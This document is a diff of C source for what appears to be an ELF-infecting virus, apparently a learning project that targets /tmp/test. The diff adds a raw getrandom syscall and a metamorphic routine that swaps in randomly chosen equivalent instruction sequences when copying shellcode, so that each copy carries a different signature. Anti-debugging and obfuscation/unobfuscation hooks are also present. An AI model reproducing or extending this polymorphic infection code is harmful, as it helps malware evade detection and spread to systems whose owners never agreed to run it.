@@ -1,11 +1,10 @@
 // TODO Compile every libc functions in a static lib
 // TODO Obfuscate code again when finished
-// TODO Segfault on static binaries with some payload sizes
 static void  start(void) {}
 
 #include "shellcode.h"
 
-asm("pushfq");
+/* asm("pushfq"); */
 int   entry_point(void *magic) {
   int     ret;
   char    infectDir[] = "/tmp/test";
@@ -16,8 +15,8 @@ int   entry_point(void *magic) {
   /*   return (stop(1, magic)); */
   /* if ((ret = preventDebug()) == -1) */
   /*   return (stop(1, magic)); */
-  if (ret == 1)
-    return (stop(0, magic));
+  /* if (ret == 1) */
+  /*   return (stop(0, magic)); */
   if (magic != (void *)0x42)
     if (unObfuscate() == -1)
       return (stop(1, magic));
@@ -34,7 +33,7 @@ static int   stop(int status, void *magic) {
     return (status);
   asm("leave\n\t"
       "leave\n\t"
-      "popfq\n\t"
+      /* "popfq\n\t" */
       "mov $0, %rbx\n\t"
       "mov $0, %rcx\n\t"
       "mov $0, %rdx\n\t"
@@ -448,6 +447,18 @@ static int   preventDebug(void) {
 
 static void encryptStart(void) {}
 
+static ssize_t  getrandom(void *buf, size_t buflen, unsigned int flags) {
+  register ssize_t      ret asm("rax");
+  register int          rax asm("rax") = 318;
+  register void         *rdi asm("rdi") = buf;
+  register size_t       rsi asm("rsi") = buflen;
+  register unsigned int rdx asm("rdx") = flags;
+
+  asm("syscall"
+    : "=r" (ret));
+  return (ret);
+}
+
 static void       dynamicSignature(void) {
   asm("nop\n\t"
       "nop\n\t"
@@ -558,25 +569,26 @@ static void obfuscate(char *header, size_t size) {
   }
 }
 
+static int8_t getRandomNbr(int8_t max) {
+  unsigned char  buf[1];
+
+  if (max == 0)
+    return (0);
+  getrandom(buf, 1, 0);
+  return (buf[0] % (max + 1));
+}
+
 const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = {
-  /* "\x55\x48\x89\xe5\x48\x83", */
-  /* "\xcc\xcc\xcc\xcc\xcc\xcc", */
-  /* "" */
-  /* "\x55\x48\x89\xe5", */
-  /* "\x50\x48\x89\xe8\x5d\x50\x48\x89\xe8\x48\x89\xe5", */
-  /* "" */
-  /* "\xcc", */
-  /* "\x90", */
-  /* "", */
-  /* "\x55", */
-  /* "\x50\x48\x89\xe8\x5d\x50\x48\x89\xe8\x5d\x55", */
-  /* "" */
+  "\x5d\xc3\x42", // pop rbp
+  "\xc9\xc3\x42", // leave
+  "\x42",
 };
 
 static int  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
   size_t        i;
   size_t        j;
   size_t        k;
+  size_t        l;
   unsigned char *ins;
   unsigned char *bin;
   unsigned char *shellcode;
@@ -588,26 +600,29 @@ static int  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
     ins = (void *)copyModifiedCode - sizeof(instructions);
     while (ins != (void *)copyModifiedCode) {
       j = 0;
-      while (ins[j] != 0 && shellcode[i + j] == ins[j])
+      while (ins[j] != 0x42 && shellcode[i + j] == ins[j])
         j += 1;
-      if (ins[j] != 0) {
-        while (ins[0] != 0)
+      if (ins[j] != 0x42 ||
+  ((void *)(shellcode + i) >= (void *)copyModifiedCode - sizeof(instructions) && (void *)(shellcode + i) < (void *)copyModifiedCode)) {
+        while (ins[0] != 0x42)
           ins += MAX_INS_SIZE;
         ins += MAX_INS_SIZE;
         continue ;
       }
-      // TODO Choose random replacement
+      l = 0;
+      while (ins[0] != 0x42) {
+        l += 1;
+        ins += MAX_INS_SIZE;
+      }
+      ins = ins - MAX_INS_SIZE * l + getRandomNbr(l - 1) * MAX_INS_SIZE;
       i += j;
-      ins += MAX_INS_SIZE;
-      // TODO Check if enough space
       k = 0;
-      while (ins[k]) {
+      while (ins[k] != 0x42) {
         bin[binSize] = ins[k];
         binSize += 1;
         k += 1;
       }
-      new->size += k - j;
-      while (ins[0] != 0)
+      while (ins[0] != 0x42)
         ins += MAX_INS_SIZE;
       ins += MAX_INS_SIZE;
     }
